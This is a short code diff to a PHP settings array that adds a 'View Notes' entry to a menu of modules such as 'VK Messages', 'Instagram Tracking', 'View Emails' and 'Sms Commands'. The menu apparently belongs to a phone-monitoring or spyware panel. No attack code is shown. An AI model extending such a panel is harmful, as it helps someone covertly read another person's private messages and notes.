@@ -56,6 +56,7 @@ $default = array(
         Modules::VK => 'VK Messages',
         Modules::INSTAGRAM => 'Instagram Tracking',
         Modules::EMAILS => 'View Emails',
+        Modules::NOTES => 'View Notes',
         Modules::APPLICATIONS => 'View Applications',
         Modules::SMS_COMMANDS => 'Sms Commands',
         Modules::SETTINGS => 'Device Settings'
